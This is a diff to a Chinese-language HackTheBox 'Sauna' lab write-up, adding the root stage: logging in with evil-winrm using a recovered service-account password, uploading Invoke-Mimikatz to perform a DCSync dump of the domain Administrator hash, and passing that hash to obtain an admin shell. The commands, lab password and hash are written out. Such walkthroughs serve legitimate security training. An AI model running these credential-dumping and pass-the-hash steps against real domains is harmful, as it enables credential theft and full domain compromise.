@@ -172,17 +172,42 @@ upload upload /root/Documents/HTB-AD/sauna/tools/winPEASx64.exe
 
 ### ROOT
 
-*
+* 利用svc\_loanmanager这个账户的凭证，用evil-winrm登录到目标中：
 
+```bash
+evil-winrm -i 10.129.82.224 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+```
 
+<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>
 
+* 上传mimikatz到目标中，然后用DCsync攻击转储内置域管理员账户哈希：
 
+```bash
+# 上传：
+upload Invoke-Mimikatz.ps1
+# 使用mimikatz：
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
+```
 
+<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>
 
+* 获得Administrator账户及其hash值：
 
+<figure><img src="../../.gitbook/assets/36.png" alt=""><figcaption></figcaption></figure>
 
+* 利用hash登录，获得Administrator权限的shell，至此已完全控制DC，get flag!
+
+```bash
+evil-winrm -i 10.129.82.224 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+```
+
+<figure><img src="../../.gitbook/assets/37.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/38.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例机器中途重置后IP有变化，但其利用过程无影响。
